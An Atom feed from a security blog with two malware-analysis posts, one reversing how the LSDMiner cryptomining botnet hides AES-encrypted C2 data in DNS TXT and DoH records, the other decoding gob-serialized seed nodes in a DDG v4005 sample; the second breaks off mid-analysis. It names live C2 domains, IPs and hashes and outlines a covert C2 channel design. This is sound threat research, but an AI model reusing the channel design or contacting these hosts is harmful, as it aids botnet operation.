<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiaYu&#39;s Blog</title>
  <subtitle>浪人</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://jiayu0x.com/"/>
  <updated>2019-11-21T12:59:11.073Z</updated>
  <id>http://jiayu0x.com/</id>
  
  <author>
    <name>0xjiayu</name>
    <email>jiayu0x@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>逆向解密 LSDMiner 新样本中 DNS TXT 通道传输的数据</title>
    <link href="http://jiayu0x.com/2019/11/22/decrypt-dns-txt-lsdminer/"/>
    <id>http://jiayu0x.com/2019/11/22/decrypt-dns-txt-lsdminer/</id>
    <published>2019-11-21T16:00:00.000Z</published>
    <updated>2019-11-21T12:59:11.073Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p><strong>本文首发于安全客，原文链接：</strong><br><a href="https://www.anquanke.com/post/id/193116" target="_blank" rel="external">https://www.anquanke.com/post/id/193116</a></p>
</blockquote>
<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>10 月中旬，我们的威胁跟踪系统捕获到 LSDMiner(旧称 <strong>Watchdogsminer</strong>) 最新活动中的一个样本(MD5:  114d76b774185b826830cb6b015cb56f)。当时大概看了一眼，里面用到了 DNS TXT 记录和 DoH(DNS over HTTPS) 来传输经过 AES 加密的数据，手头忙别的事，就先搁下了。近来捡起来分析，Google 搜索样本中用到的一个函数 <strong>NewAesCipher128()</strong> ，发现国外安全公司 <strong>Anomali</strong> 已经分析过这个 Case ：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/google_search.png" style="zoom:50%;"></p>
<p>Anomali 的 Blog： <a href="https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect" target="_blank" rel="external">Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect</a></p>
<p>跟 <a href="https://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/">以前的版本</a> 一样，LSDMiner 的样本仍然是用 Go 编写，但是内部代码结构以及具体功能已经跟旧版本有很大差异。明显的差异至少有以下 3 点：</p>
<ul>
<li>放弃了使用 Pastebin 作为恶意 Shell 脚本的下发通道，转而使用自己维护的 CC 服务器( <code>*.systemten.org</code> )来承载相关恶意活动；</li>
<li>集成了多个漏洞 Exp，增强传播能力，详见 Anomali 的 Blog；</li>
<li>利用 DNS TXT 记录下发多种经过 AES 加密的数据，这些加密数据有以下几种：<ul>
<li>最新的恶意 Cron 任务用到的恶意 Shell 脚本下载 URL，可以写入失陷主机的 Cron 任务；</li>
<li>最新的恶意样本版本号，失陷主机上已有的恶意样本会对比自己的版本号以决定是否 Update；</li>
<li>最新的恶意 Shell 脚本；</li>
<li>一系列最新二进制样本的下载 URL。</li>
</ul>
</li>
</ul>
<p>其他恶意行为按照常规的逆向分析方法按部就班分析即可，而关于加密的 DNS TXT 数据的逆向与解密过程，Anomali 的 Blog 中描述一带而过，并没详述，按照他们 Blog 中简单的描述，并不足以解密这些数据。本文就以上述样本为例，解析一下如何通过逆向样本一步一步解密这些数据。</p>
<a id="more"></a>
<h2 id="2-恶意样本执行流程"><a href="#2-恶意样本执行流程" class="headerlink" title="2. 恶意样本执行流程"></a>2. 恶意样本执行流程</h2><p>恶意样本总体的执行流程分为 3 步：</p>
<ol>
<li>通过 DNS TXT 通道获取用来篡改失陷主机 Cron 任务的恶意 URL，被篡改后的 Cron 任务会定期访问恶意 URL 获取最新的恶意 Shell 脚本；</li>
<li>扫描当前 B 段网络，存活的  IP 尝试利用 4 种方式入侵并植入，4 种方式有：<ul>
<li>SSH 爆破；</li>
<li>Redis 未授权访问；</li>
<li>Jenkins RCE 漏洞(CVE-2019-1003000)利用；</li>
<li>ActiveMQ RCE 漏洞(CVE-2016-3088)利用</li>
</ul>
</li>
<li>持久驻留失陷主机、释放矿机程序挖矿。</li>
</ol>
<p>在最后第 3 步，也会通过 DNS TXT 通道获取最新恶意 Shell 脚本以及二进制样本的下载 URL。本文重点分析 DNS TXT 通道数据的获取以及解密。</p>
<p>先看一下恶意样本通过 DNS TXT 通道获取最新的用来篡改失陷主机 Cron 任务的恶意 URL 的整体流程：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/lookup_and_dec_dnstxt.png" alt=""></p>
<p>可以看到样本首先从<code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code> 获取数据，然后用 AES-128bit 算法将其解密。再看一下从 <code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code> 获取的加密数据：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/dns_txt_rec.png" alt=""></p>
<p>DNS TXT 响应是一串字符，而且是经过 Base64 编码的字符串 <em>A7PZtADnYAEMEArGhmA9xQihPq9TRz4QigssjeOmUnQ</em> 。函数 <strong>github_com_hippies_LSD_LSDC__AesCipher128_Decrypt()</strong> 中的处理流程可以证实这一点：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/func_aescipher128_decrypt.png" style="zoom:60%;"></p>
<p>到这里可以看出，要用 Go 语言编程解密这些数据，需要 3 步走：</p>
<ol>
<li>Base64 解码 DNS TXT 的响应字串，得到待解密的二进制数据；</li>
<li>初始化 Go AES-128bit 解密句柄；</li>
<li>解密 Base64 解码过的二进制数据。</li>
</ol>
<h2 id="3-Base64-解码"><a href="#3-Base64-解码" class="headerlink" title="3. Base64 解码"></a>3. Base64 解码</h2><p>先用 Linux 自带的命令行工具 <strong>base64</strong> 尝试解码：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64_decode_fail.png" alt=""></p>
<p>有点蹊跷，不能用 base64 命令直接解码，看来用的并不是标准的 Base64 编码。这里先补充一下关于 Base64 编码的两点背景知识：</p>
<ol>
<li>参考: <a href="https://tools.ietf.org/html/rfc4648" target="_blank" rel="external">RFC4648</a> ，Base64 编码主要有两种：<strong>标准编码(StdEncoding)</strong> 和 <strong>URL 安全的编码(URLEncoding)</strong>。标准 Base64 编码的编码字符表是 <em>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</em> ，而 URLEncoding 的编码字符表则把 StdEncoding 编码字符表中的 <strong>+</strong> 替换为 <strong>-</strong>，把 <strong>/</strong> 替换为 <strong>_</strong> ，即 <em>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_</em> ；</li>
<li>Base64 两种编码的默认填充字符都是 <strong>=</strong> ，但也可以选择不填充任何字符。</li>
</ol>
<p>上述两个知识点，在 <a href="https://golang.org/pkg/encoding/base64/?m=all" target="_blank" rel="external">Go 的 Base64 标准库文档</a> 开头就有说明：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/base64_godoc.png" alt=""></p>
<p>两个知识点各自分为两种情况，这样组合起来就有 4 种细分的 Base64 Encoding：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/different_type_encodings.png" alt=""></p>
<p>那 LSDMiner 样本中具体是用什么样的 Base64 解码呢？需要先看一下样本中 Base64 解码的 Encoding 句柄是如何生成的。在函数 <strong>github_com_hippies_LSD_LSDC__AesCipher128_Decrypt()</strong> 中，是先拿到 Base64 解码的 Encoding 句柄再进行解码：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/call_b64encodingobj.png" alt=""></p>
<p>通过上面的 xrefs 信息，可知这个 <strong>b64EncodingObj</strong> 是在函数 <strong>encoding_base64_init()</strong> 中生成的。进入这个 init 函数，<strong>b64EncodingObj</strong> 生成过程如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64encoding_init.png" alt=""></p>
<p>可以看到这样两点：</p>
<ol>
<li>调用 base64.NewEncoding() 函数时，传入的参数是 URLEncoding 的编码字符表，即样本中用的是 URLEncoding 形式的 Base64 编码；</li>
<li>调用 base64.URLEncoding.WithPadding() 函数时传入的参数是 <strong>-1</strong> ，即 <strong>base64.NoPadding</strong> ，不带填充字符，即 <strong>base64.RawURLEncoding</strong>。</li>
</ol>
<p>至此就可以解码 DNS TXT 响应的字符串了。测试代码与结果如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64_decode_test.png" alt=""></p>
<h2 id="4-AES-解密二进制数据"><a href="#4-AES-解密二进制数据" class="headerlink" title="4. AES 解密二进制数据"></a>4. AES 解密二进制数据</h2><p>通过前面粗略的逆向分析，我们仅知道样本中用了 AES-128bit 算法来解密数据，但这些知识远不足以解密上面用 Base64 解码得到的二进制数据。AES 加密算法此处不详述，可以自行搜索相关资料，本文只关注如何用算法来解密数据。要想正确解密数据，还需要确定以下 AES 解密算法相关的几个要素：</p>
<ul>
<li>AES 密钥；</li>
<li>AES 解密用到的 IV 向量；</li>
<li>AES 解密算法的分组密码模式；</li>
<li>AES 解密算法的 Padding 方式。</li>
</ul>
<p>上面的逆向分析过程中，我们注意到样本中调用了函数 <strong>crypto_cipher_NewCBCDecrypter()</strong> ，可以确认样本中用到的分组密码模式是 <strong>CBC</strong>。</p>
<p>在分析确认其他几个要素之前，我们先捋一下两个关键函数的逻辑：初始化 AES 解密句柄的 <strong>NewAesCipher128()</strong> 和 执行 AES 解密操作的 <strong>AesCipher128_Decrypt()</strong>。</p>
<h3 id="4-1-NewAesCipher128"><a href="#4-1-NewAesCipher128" class="headerlink" title="4.1 NewAesCipher128"></a>4.1 NewAesCipher128</h3><p>首先，样本调用该函数的时候传入一个参数，即待查询 DNS TXT 记录的域名字符串 <code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code>：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/call_newaescipher128.png" style="zoom:50%;"></p>
<p>在函数内部先初始化一个 <strong>crypto/md5</strong> 句柄（代码片段对照左边标准库函数 <strong>crypto_md5_New()</strong> 即可理解)：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/md5_init.png" alt=""></p>
<p>然后将传入的域名字符串由 string 类型转成字符切片并写入 MD5 digest 对象，再通过 <strong>md5.digest.Sum()</strong> 函数做一次 MD5 Hash 计算(注意 Sum 函数传入的参数为 <strong>nil</strong> )：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/first_round_md5_hash.png" style="zoom:55%;"></p>
<p>再把这轮 MD5 计算的值通过 <strong>hex.EncodeToString()</strong> 转成 32-bytes 的字符串，即常规的字符串形式的 MD5 值。然后取出再取出这个 MD5 值的<strong>前 16 字节</strong>，保存到变量(<strong>r1HashStr_16bytes</strong>)中备用：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/slice_r1hashstr.png" style="zoom:60%;"></p>
<p>接下来，样本又做了一次 MD5 计算，并且取出这一次 MD5 值的<strong>后 16 字节</strong>，保存到变量中备用(注意，这一次 MD5 计算之前没有调用 md5.dgest.Write() 来写入新字节，并且调用 md5.digest.Sum() 函数时依然传入参数 <strong>nil</strong> ):</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/r2_md5_hash.png" style="zoom:60%;"></p>
<p>后面可以看到，第一次 MD5 计算后取出的 <strong>前 16 字节</strong> 数据，被作为 <strong>AES 密钥</strong>传入 <strong>aes.NewCipher()</strong> 函数来初始化 AES 解密句柄：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/init_aes_cipher.png" style="zoom:80%;"></p>
<p>而第二次 MD5 计算后取出的 <strong>后 16 字节</strong> 数据被保存起来，作为本函数返回值的一部分返回，接下来作为 <strong>AES 的 IV 向量</strong>传给后面函数 <strong>AesCipher128_Decrypt()</strong> 中调用的 <strong>crypto_cipher_NewCBCDecrypter()</strong> 函数。</p>
<h3 id="4-2-AES-的-Padding-方式"><a href="#4-2-AES-的-Padding-方式" class="headerlink" title="4.2 AES 的 Padding 方式"></a>4.2 AES 的 Padding 方式</h3><p>前面内容分析确认了 AES 的 Key、IV 以及分组密码模式，还需最后确认 AES 算法所用的 Padding 方式，即可正确解密数据。这一个点需要逆向分析函数 <strong>AesCipher128_Decrypt()</strong> 才能确认。</p>
<p>AES 加密算法用到的常见的 Padding 方式有以下几种(参考： <a href="https://www.jianshu.com/p/b63095c59361" target="_blank" rel="external">对称加密算法和分组密码的模式</a>)：</p>
<ul>
<li><p>ANSI X.923：也叫 <strong>ZeroPadding</strong>，填充序列的最后一个字节填<code>paddingSize</code>，其它填0。</p>
</li>
<li><p>ISO 10126：填充序列的最后一个字节填<code>paddingSize</code>， 其它填随机数。</p>
</li>
<li><p>PKCS7：填充序列的每个字节都填<code>paddingSize</code> 。</p>
</li>
</ul>
<p>LSDMiner 中用到的 Padding 方式就是简单的 ZeroPadding，通过函数 <strong>AesCipher128_Decrypt()</strong> 中解密操作后的 <strong>byte.Trim()</strong> 函数即可确认：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/unpadding.png" style="zoom:50%;"></p>
<h3 id="4-3-补充说明——关于二轮-MD5-值计算"><a href="#4-3-补充说明——关于二轮-MD5-值计算" class="headerlink" title="4.3 补充说明——关于二轮 MD5 值计算"></a>4.3 补充说明——关于二轮 MD5 值计算</h3><p>上述分析过程中描述过，恶意样本为生成 AES 解密用到的 Key 和 IV 向量，对相应域名字符串连续做了 2 轮 MD5 Hash 计算，这一点 Anomali 的 Blog 中也提到了，只是他们没提到 Key 和 IV 具体的生成过程。</p>
<p>然而样本中连续两轮的 MD5 计算的值其实是相同的——这是 Go 语言特有的 MD5 计算方式，参考 <a href="https://codeday.me/bug/20190214/636073.html" target="_blank" rel="external">hash – Golang md5 Sum()函数</a> ，演示代码如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/md5_test.png" style="zoom:60%;"></p>
<p>这一点不知道是恶意软件作者的失误，还是有意为之。倒是容易给逆向分析造成困扰，因为乍一看“两轮 MD5 计算”，很可能直观认为应该得出两个不同的 MD5 值，并分别截取一段做 AES 解密的 Key 和 IV 向量，没想到两次 MD5 计算得出相同的值。</p>
<h2 id="5-完成解密"><a href="#5-完成解密" class="headerlink" title="5. 完成解密"></a>5. 完成解密</h2><p>基于以上分析，就可以编写程序完成我们想要的解密工作了。完整的 Go 语言代码已上传到 Github：</p>
<p> <a href="https://github.com/0xjiayu/LSDMiner_DNS_TXT_Decrypt" target="_blank" rel="external">https://github.com/0xjiayu/LSDMiner_DNS_TXT_Decrypt</a> </p>
<p>运行结果如下：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/aes_decrypt.png" alt=""></p>
<p>当前解密出来的 Cron URL 是 <strong><code>lsd.systemten.org</code></strong> ，在样本中如果整个 DNS TXT 数据通道操作过程有任何异常而无法解密出最新的 Cron URL，备用的默认值也是这个 <strong><code>lsd.systemten.org</code></strong> :</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/return_decryption_result.png" style="zoom:80%;"></p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>文章开头的截图中已经显示过，如果样本用 <strong>net.LookupTXT()</strong> 函数检索 DNS TXT 记录失败，还会跳转到另外一个代码分支，去用 DoH(DNS over HTTPS) 向 CloudFlare 的 DoH 服务器请求相应的 DNS TXT 记录：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_req_1.png" alt=""></p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_via_cloudflare.png" alt=""></p>
<p>我们用命令行工具测试一下，可以看到这种方式也有效：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_test.png" alt=""></p>
<p>利用 DNS TXT 记录和 DoH 下发恶意数据来辅助恶意样本的运行，可以进一步提升整个 Botnet 基础设施的健壮性和运营的灵活性，鉴于这个 Botnet 存活已久并不断更新，应该引起业界的持续关注。</p>
<p>前文说过，恶意样本中利用 DNS TXT 通道传输的数据还有其他几种，方式都是一样：检索 DNS TXT 数据，用 base64.RawURLEncoding 解码得到二进制数据；然后对域名进行 MD5 计算得出 AES 解密用到的 Key 和 IV，然后用 CBC 模式、ZeroPadding 的 AES-128bit 算法对 Base64 解码后的二进制数据进行解密。对应的域名还有以下几个，均可以用以上 Go 程序来解密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&quot;update.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;shell.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;1x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;2x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;3x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;1x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;2x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;3x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div></pre></td></tr></table></figure>
<p>另外，LSDMiner 涉及的二进制恶意样本，都用变形 UPX 加了壳，而且壳的特征很不明显，难以用固定的特征直接检测加壳的样本。并且，相关加壳二进制样本的 UPX 壳幻数(Magic Number)还经常变化，比如本文分析的 MD5 为 <strong>114d76b774185b826830cb6b015cb56f</strong> 的 UPX 壳幻数为 <strong>0x2124922A</strong>；最新的 x86_64 架构的样本(MD5: <strong>78e3582c42824f17aba17feefb87ea5f</strong>) 的 UPX 壳幻数则变成了<strong>0x215E77F2</strong> 。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;本文首发于安全客，原文链接：&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/193116&quot;&gt;https://www.anquanke.com/post/id/193116&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;p&gt;10 月中旬，我们的威胁跟踪系统捕获到 LSDMiner(旧称 &lt;strong&gt;Watchdogsminer&lt;/strong&gt;) 最新活动中的一个样本(MD5:  114d76b774185b826830cb6b015cb56f)。当时大概看了一眼，里面用到了 DNS TXT 记录和 DoH(DNS over HTTPS) 来传输经过 AES 加密的数据，手头忙别的事，就先搁下了。近来捡起来分析，Google 搜索样本中用到的一个函数 &lt;strong&gt;NewAesCipher128()&lt;/strong&gt; ，发现国外安全公司 &lt;strong&gt;Anomali&lt;/strong&gt; 已经分析过这个 Case ：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/lsdminer_dnstxt_decrept/google_search.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Anomali 的 Blog： &lt;a href=&quot;https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect&quot;&gt;Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;跟 &lt;a href=&quot;https://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/&quot;&gt;以前的版本&lt;/a&gt; 一样，LSDMiner 的样本仍然是用 Go 编写，但是内部代码结构以及具体功能已经跟旧版本有很大差异。明显的差异至少有以下 3 点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;放弃了使用 Pastebin 作为恶意 Shell 脚本的下发通道，转而使用自己维护的 CC 服务器( &lt;code&gt;*.systemten.org&lt;/code&gt; )来承载相关恶意活动；&lt;/li&gt;
&lt;li&gt;集成了多个漏洞 Exp，增强传播能力，详见 Anomali 的 Blog；&lt;/li&gt;
&lt;li&gt;利用 DNS TXT 记录下发多种经过 AES 加密的数据，这些加密数据有以下几种：&lt;ul&gt;
&lt;li&gt;最新的恶意 Cron 任务用到的恶意 Shell 脚本下载 URL，可以写入失陷主机的 Cron 任务；&lt;/li&gt;
&lt;li&gt;最新的恶意样本版本号，失陷主机上已有的恶意样本会对比自己的版本号以决定是否 Update；&lt;/li&gt;
&lt;li&gt;最新的恶意 Shell 脚本；&lt;/li&gt;
&lt;li&gt;一系列最新二进制样本的下载 URL。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其他恶意行为按照常规的逆向分析方法按部就班分析即可，而关于加密的 DNS TXT 数据的逆向与解密过程，Anomali 的 Blog 中描述一带而过，并没详述，按照他们 Blog 中简单的描述，并不足以解密这些数据。本文就以上述样本为例，解析一下如何通过逆向样本一步一步解密这些数据。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="lsdminer" scheme="http://jiayu0x.com/tags/lsdminer/"/>
    
      <category term="aes" scheme="http://jiayu0x.com/tags/aes/"/>
    
      <category term="decrypt" scheme="http://jiayu0x.com/tags/decrypt/"/>
    
  </entry>
  
  <entry>
    <title>以 DDG v4005 样本为例浅谈 Golang gob 序列化数据的逆向解码</title>
    <link href="http://jiayu0x.com/2019/11/19/decode-gob-data-in-ddg-v4005/"/>
    <id>http://jiayu0x.com/2019/11/19/decode-gob-data-in-ddg-v4005/</id>
    <published>2019-11-18T16:00:00.000Z</published>
    <updated>2019-11-21T12:55:08.136Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p><strong>本文首发于安全客，原文链接：</strong><br><a href="https://www.anquanke.com/post/id/192948" target="_blank" rel="external">https://www.anquanke.com/post/id/192948</a></p>
</blockquote>
<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>DDG 是一个 一直活跃的挖矿僵尸网络，其主样本由 Go 语言编写。它最新活跃的版本中用基于 Gossip 协议实现集群管理的第三方库 <strong><a href="https://github.com/hashicorp/memberlist" target="_blank" rel="external">Memberlist</a></strong> 把整个僵尸网络构建成了一个非典型的 P2P 结构。关于其 P2P 网络结构以及如何基于 P2P 特性追踪该僵尸网络，我在以前的两篇文章中有详细描述：</p>
<ol>
<li><a href="https://www.anquanke.com/post/id/177665" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络(上)</a></li>
<li><a href="https://www.anquanke.com/post/id/177742" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络(下)</a></li>
</ol>
<p>11.6 日晚上，我的 DDG 挖矿僵尸网络追踪程序检测到 DDG 家族更新到了版本 4005，IoC 如下：</p>
<blockquote>
<p><strong>MD5:</strong></p>
<ul>
<li>64c6692496110c0bdce7be1bc7cffd47  ddgs.i686</li>
<li>638061d2a06ebdfc82a189cf027d8136  ddgs.x86_64 </li>
</ul>
<p><strong>CC</strong>:</p>
<ul>
<li>67.207.95[.]103:8000</li>
<li>103.219.112[.]66:8000 </li>
</ul>
</blockquote>
<p>经过简单的分析，新版恶意样本的关键行为与旧版本差异不大，以前部署的追踪程序依然能持续追踪。不过其中一个小的技术点引起了我的注意。</p>
<p>以前说过，DDG 样本为了通过 Memberlist 库加入 P2P 网络(函数 <code>Memberlist.join()</code>)，需要一批初始的 P2P Nodes ，新的样本代表的 P2P 节点会通过这些初始的 P2P Nodes 加入 P2P 网络。在旧版样本中，这些初始的 P2P Nodes 被称为 <strong>Hub List</strong>，其中约有 200 个 节点 IP 地址，这一份 IP 列表以 Hex 数组形式硬编码保存在样本中。而新版 DDG 样本中则把这些 P2P Nodes 称为 <strong>Seeds</strong>(Memberlist 库 <code>Join()</code> 函数的 ”种子“)，这些 Seeds 用 <a href="https://blog.golang.org/gobs-of-data" target="_blank" rel="external">Golang gob</a> 序列化编码后再硬编码保存在样本中，样本里还用一组 <code>ddgs_network__mlUtils_*</code> 函数来处理这些 Seeds：</p>
<a id="more"></a>
<p><img src="/imgs/decrypt_gob/mlutils_funcs.png" style="zoom:60%;"></p>
<p>对于旧版样本的做法，定位到 Hub List 数据后，在 IDAPro 中逆向分析样本时直接用 IDAPython 脚本将 Hex 形式的 IP 地址转成点分十进制表示即可一目了然把这些 IP 提取出来，但新版样本中这些数据被 gob 序列化编码过，该怎么提取？</p>
<h2 id="2-gob-序列化编码"><a href="#2-gob-序列化编码" class="headerlink" title="2. gob 序列化编码"></a>2. gob 序列化编码</h2><p>gob(<strong>Go Binary</strong> 的简称)，是 Go 语言自带的序列化编码方案，用法简洁，灵活性和效率很高，也有一定的扩展性。可以类比 Python 的 Pickle，用来对结构化数据进行序列化编解码以方便数据传输。由于 gob 是 Go 独有的，并没有现成的 Python 接口，所以想用 Python 在 IDAPro 中直接解码不太现实，就只好手动把编码过的二进制数据从样本中 Dump 出来，然后写 Go 程序来解码。</p>
<p>使用 gob 对数据编码，一般是发送端针对已定义好结构的数据进行编码后发送；接收端收到二进制数据后，按照与发送端<strong>兼容</strong>的数据结构进行解码(不一定是完全相同的结构定义，但数据类型以及数量要兼容发送端的数据结构定义，这个 <strong>兼容</strong> 则体现了 gob 的灵活性)。一个简单的数据结构如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> S <span class="keyword">struct</span> &#123;</div><div class="line">	X, Y, Z <span class="keyword">int</span></div><div class="line">	Name    <span class="keyword">string</span></div><div class="line">    L       []<span class="keyword">string</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以，要逆向分析经 gob 序列化编码过的数据，对数据进行精准解码，最大的难点在于逆向出 Go 语言形式的数据结构定义。</p>
<p>gob 的用法不是本文重点，可以参考<a href="https://blog.golang.org/gobs-of-data" target="_blank" rel="external">官方介绍</a> 与这一篇<a href="https://www.bitlogs.tech/2019/08/go-encoding/gob/" target="_blank" rel="external">中文详解</a> 。</p>
<h2 id="3-恶意样本中的数据解码过程"><a href="#3-恶意样本中的数据解码过程" class="headerlink" title="3. 恶意样本中的数据解码过程"></a>3. 恶意样本中的数据解码过程</h2><p>以样本 ddgs.x86_64(MD5: <strong>638061d2a06ebdfc82a189cf027d8136</strong>) 为例，在函数 <code>ddgs_network__mlUtils_JoinAll()</code> 中，通过对 <code>Memberlist.Join()</code> 函数的调用，即可顺藤摸瓜找到数据解码以及转换的函数：</p>
<p><img src="/imgs/decrypt_gob/process_of_data_dec.png" alt=""></p>
<p>最上面的 <code>ddgs_network__mlUtils_Seeds()</code> 函数中，可以看到样本中经 gob 序列化编码的数据地址与长度，样本先是读取这一段数据，然后用 gob 进行解码：</p>
<p><img src="/imgs/decrypt_gob/decode_raw_data.png" alt=""></p>
<p>在 IDAPro 中逆向分析样本，无法还原数据的结构定义。我们把这段数据手动 Dump 出来看看：</p>
<p><img src="/imgs/decrypt_gob/hexdump_of_raw_data.png" alt=""></p>
<p>可以看到高亮的两个字段名：<strong>IP</strong> 和 <strong>Port</strong>。到这里就有点灵感了，我们再看看解密后的数据是如何使用的，就能看出这些数据到底是什么结构了。在函数 <code>ddgs_network__mlUtils_Seeds()</code> 中继续往下看，会发现样本为了把这些 Seed Nodes 列表输出到日志中，用 <code>ddgs_network__mlUtils_Seeds_func1()</code> 函数把解密后的数据做了解析、重组：</p>
<p><img src="/imgs/decrypt_gob/logprint_plain_data.png" style="zoom:60%;"></p>
<p>在函数<code>ddgs_network__mlUtils_Seeds_func1()</code> 中，样本内部把解密后的数据以循环处理的方式，依次调用 <code>ddgs_network__seedNode_Address()</code> 函数来解析成字符串，并把每个代表 Seed Node 的字符串用竖线 <strong>|</strong> 连接起来：</p>
<p><img src="/imgs/decrypt_gob/convert_seed_node.png" style="zoom:50%;"></p>
<p>看来逆向出数据结构定义的关键就是 <code>ddgs_network__seedNode_Address()</code> 函数函数了：</p>
<p><img src="/imgs/decrypt_gob/convert_seed_node_do.png" style="zoom:50%;"></p>
<p>可以看到 <code>ddgs_network__seedNode_Address()</code> 函数中，对每一个 Seed Node 对象都做两部分处理：第一个成员是用 Go 标准库 <code>net.IP.String()</code> 函数将 <code>net.IP</code> 对象转化为 String 类型；第二个成员是直接转化为 64bit 整型值。最后将 String 类型的 IP 地址与整型的 Port 值串成一个 <code>IP:Port</code> 结构的字符串来代表一个 Seed Node。</p>
<p>这正好跟前文用 Hexdump 查看 Raw 二进制数据里的两个字段 <strong>IP</strong> 和 <strong>Port</strong> 对上了。</p>
<p>至此，我们就可以断定，这些 gob 编码数据的<strong>基础结构定义</strong>应该如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="string">"net"</span></div><div class="line"></div><div class="line"><span class="keyword">type</span> SeedNode <span class="keyword">struct</span> &#123;</div><div class="line">	IP   net.IP</div><div class="line">	Port <span class="keyword">int64</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
